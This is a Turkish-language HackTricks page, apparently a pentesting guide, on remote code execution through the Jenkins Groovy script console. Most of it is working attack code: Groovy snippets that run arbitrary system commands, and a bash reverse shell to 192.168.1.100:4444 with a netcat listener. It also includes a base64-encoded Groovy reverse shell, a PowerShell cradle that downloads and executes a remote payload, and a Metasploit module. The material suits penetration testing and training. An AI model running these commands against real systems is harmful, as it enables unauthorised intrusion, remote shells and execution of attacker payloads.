# Jenkins Groovy Script ile Uzaktan Kod Çalıştırma (RCE)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

## Jenkins Groovy Script ile Uzaktan Kod Çalıştırma (RCE)

Bu, Jenkins'te yeni bir proje oluşturmaktan daha az gürültülüdür.

1. _path\_jenkins/script_ dizinine gidin.
2. Metin kutusuna betiği girin.
```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```
Aşağıdaki komutu kullanarak bir komutu çalıştırabilirsiniz: `cmd.exe /c dir`

**Linux** için ise şunu yapabilirsiniz: **`"ls /".execute().text`**

Metin içinde _alıntılar_ ve _tek tırnaklar_ kullanmanız gerekiyorsa, yükü çalıştırmak için _"""PAYLOAD"""_ (üçlü çift tırnak) kullanabilirsiniz.

**Başka bir kullanışlı groovy betiği** şudur (yerine \[KOMUT EKLEYİN]):
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### Linux'ta ters kabuk

Bir ters kabuk, hedef bir sisteme erişim sağlamak için kullanılan bir saldırı tekniğidir. Bu teknik, hedef sisteme bir kabuk sunucusu bağlantısı oluşturarak saldırganın komutları çalıştırmasına olanak tanır.

Aşağıdaki adımları izleyerek Linux'ta bir ters kabuk oluşturabilirsiniz:

1. İlk olarak, saldırganın dinleyeceği bir IP adresi ve port belirleyin. Örneğin, IP adresi 192.168.1.100 ve port 4444 olarak varsayalım.

2. Ardından, hedef sisteme bir ters kabuk oluşturmak için bir komut çalıştırın. Aşağıdaki komutu kullanabilirsiniz:

```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

Bu komut, hedef sisteme bir ters kabuk oluşturacak ve saldırganın komutları çalıştırmasına olanak tanıyacaktır.

3. Son olarak, saldırganın dinleme yapabilmesi için bir kabuk sunucusu başlatın. Bu işlem için çeşitli araçlar kullanılabilir, örneğin `netcat` veya `nc` komutu. Aşağıdaki komutu kullanarak `netcat` aracını kullanabilirsiniz:

```bash
nc -lvp 4444
```

Bu komut, saldırganın hedef sisteme bağlanmasını sağlayacak ve ters kabuk komutlarını almasına olanak tanıyacaktır.

Bu adımları takip ederek Linux'ta bir ters kabuk oluşturabilir ve hedef sisteme erişim sağlayabilirsiniz. Ancak, unutmayın ki bu tür saldırılar yasa dışıdır ve yalnızca yasal izinlerle gerçekleştirilmelidir.
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### Windows'ta ters kabuk

Bir PS ters kabukla birlikte bir HTTP sunucusu hazırlayabilir ve Jeking'i kullanarak onu indirip çalıştırabilirsiniz:
```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```
### Script

Bu işlemi [**bu betikle**](https://github.com/gquere/pwn\_jenkins/blob/master/rce/jenkins\_rce\_admin\_script.py) otomatikleştirebilirsiniz.

Ters kabuk almak için MSF'i kullanabilirsiniz:
```
msf> use exploit/multi/http/jenkins_script_console
```
<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
